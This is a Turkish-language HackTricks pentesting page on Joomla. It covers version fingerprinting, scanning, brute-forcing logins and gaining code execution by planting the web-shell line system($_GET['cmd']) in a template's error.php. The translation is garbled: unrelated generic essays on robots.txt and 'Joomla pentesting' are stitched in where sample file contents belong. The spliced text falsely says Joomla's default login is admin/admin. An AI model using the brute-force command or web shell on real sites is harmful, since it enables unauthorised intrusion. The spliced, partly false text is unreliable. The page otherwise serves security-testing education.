# Joomla

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

### Joomla İstatistikleri

Joomla, Joomla kurulumlarında kullanılan Joomla, PHP ve veritabanı sürümlerinin ve sunucu işletim sistemlerinin dağılımı gibi bazı anonim [kullanım istatistikleri](https://developer.joomla.org/about/stats.html) toplar. Bu verilere, halka açık [API](https://developer.joomla.org/about/stats/api.html) aracılığıyla sorgu yapılabilir.
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## Numaralandırma

### Keşif/Ayak İzi Alma

* **meta** etiketlerini kontrol edin.
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
# robots.txt

Robots.txt dosyası, web sitenizin arama motorları tarafından taranmasını istemediğiniz belirli sayfaları veya dizinleri belirtmek için kullanılır. Bu dosya, web tarayıcılarına ve arama motorlarına hangi sayfaların taranabileceğini ve hangilerinin taranamayacağını söyler.

Robots.txt dosyası, web sitenizin kök dizininde bulunmalıdır. Arama motorları, bu dosyayı tarayarak hangi sayfaların taranabileceğini belirler. Bu dosya, web sitenizin güvenlik açıklarını ortaya çıkarmamak için dikkatli bir şekilde yapılandırılmalıdır.

Örneğin, aşağıdaki robots.txt dosyası, tüm arama motorlarının /gizli-dizin/ sayfasını taranmasını engeller:

```
User-agent: *
Disallow: /gizli-dizin/
```

Bu dosya, "User-agent" alanında "*" kullanarak tüm arama motorlarını hedef alır ve "Disallow" alanında "/gizli-dizin/" dizinini engeller.

Robots.txt dosyası, web sitenizin güvenliğini artırmak için kullanılabilecek bir araçtır. Ancak, bu dosyanın tamamen güvenli olduğunu varsaymamalısınız. Bir saldırgan, bu dosyayı kullanarak web sitenizin yapısını ve potansiyel güvenlik açıklarını keşfedebilir. Bu nedenle, robots.txt dosyanızı düzenlerken dikkatli olmalı ve hassas bilgileri ifşa etmemelisiniz.
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

# Joomla

Joomla, açık kaynaklı bir içerik yönetim sistemi (CMS) olan PHP tabanlı bir web uygulamasıdır. Joomla, kullanıcıların web sitelerini oluşturmasına, düzenlemesine ve yönetmesine olanak tanır. Bu bölümde, Joomla web uygulamalarını hedef alan pentesting tekniklerini öğreneceksiniz.

## Joomla Pentesting

Joomla web uygulamalarını pentest etmek için aşağıdaki adımları izleyebilirsiniz:

1. Joomla sürümünü belirleyin: Joomla sürümünü belirlemek, zayıf noktaları tespit etmek için önemlidir. Joomla sürümünü belirlemek için web sitesinin kaynak kodunu inceleyebilir veya Joomla'nın varsayılan dosya ve dizin yapısını kontrol edebilirsiniz.

2. Joomla'nın varsayılan kullanıcı adı ve şifresini değiştirin: Joomla'nın varsayılan kullanıcı adı "admin" ve şifresi "admin"dir. Bu nedenle, yönetici hesabının varsayılan kullanıcı adı ve şifresini değiştirmek güvenlik açısından önemlidir.

3. Joomla eklentilerini kontrol edin: Joomla, çeşitli eklentilere sahiptir ve bu eklentiler güvenlik açıklarına neden olabilir. Joomla web uygulamasını pentest etmeden önce, kullanılan eklentileri kontrol etmek ve güncellemeleri kontrol etmek önemlidir.

4. Joomla'nın güvenlik ayarlarını kontrol edin: Joomla'nın güvenlik ayarlarını kontrol etmek, web uygulamasının güvenliğini artırmak için önemlidir. Güvenlik ayarlarını kontrol etmek için Joomla'nın yönetici paneline erişebilir ve güvenlik ayarlarını inceleyebilirsiniz.

5. Joomla'nın veritabanını inceleyin: Joomla web uygulamasının veritabanını incelemek, kullanıcı bilgilerini ve diğer hassas verileri ortaya çıkarmak için önemlidir. Veritabanını incelemek için SQL enjeksiyonu ve diğer veritabanı saldırı tekniklerini kullanabilirsiniz.

6. Joomla'nın dosya ve dizin yapısını kontrol edin: Joomla'nın dosya ve dizin yapısını kontrol etmek, web uygulamasının güvenliğini değerlendirmek için önemlidir. Dosya ve dizin yapısını kontrol etmek için web sitesinin kaynak kodunu inceleyebilirsiniz.

7. Joomla'nın güvenlik açıklarını tespit etmek için otomatik araçlar kullanın: Joomla web uygulamalarını pentest etmek için otomatik araçlar kullanabilirsiniz. Bu araçlar, güvenlik açıklarını tespit etmek ve zayıf noktaları ortaya çıkarmak için kullanılabilir.

Bu adımları izleyerek Joomla web uygulamalarını pentest edebilir ve güvenlik açıklarını tespit edebilirsiniz. Ancak, pentest yaparken yasalara ve etik kurallara uymak önemlidir.
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### Sürüm

* Joomla'nın sürümünü görmek için **/administrator/manifests/files/joomla.xml** dosyasına bakabilirsiniz.
* Joomla'nın sürümünü almak için **/language/en-GB/en-GB.xml** dosyasına bakabilirsiniz.
* Yaklaşık bir sürümü görmek için **plugins/system/cache/cache.xml** dosyasına bakabilirsiniz.

### Otomatik
```bash
droopescan scan joomla --url http://joomla-site.local/
```
In[ **80,443 - Pentesting Web Methodology**](./#cms-scanners) bölümünde Joomla taraması yapabilen CMS tarayıcıları hakkında bilgi verilmektedir.

### Brute-Force

Giriş yapmak için brute force saldırısı yapmak için bu [script](https://github.com/ajnik/joomla-bruteforce) kullanılabilir.
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## Uzaktan Kod Yürütme (RCE)

Eğer **yönetici kimlik bilgilerine** sahip olduysanız, **RCE içinde** bulunmak için bir **PHP kodu parçacığı** ekleyebilirsiniz. Bunun için bir **şablonu özelleştirmemiz** gerekmektedir.

1. `Yapılandırma` altında sol alt köşede bulunan **`Şablonlar`** üzerine **tıklayın** ve şablon menüsünü açın.
2. **`Şablon`** sütunu başlığı altında **`protostar`** şablonunu seçin. Bu bizi **`Şablonlar: Özelleştir`** sayfasına götürecektir.
3. Son olarak, **sayfa kaynağını** açmak için bir sayfaya **tıklayabilirsiniz**. **`error.php`** sayfasını seçelim. Aşağıdaki gibi **PHP tek satırlık bir kod ekleyerek kod yürütme** yapacağız:
1. **`system($_GET['cmd']);`**
4. **Kaydet ve Kapat**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin!</summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
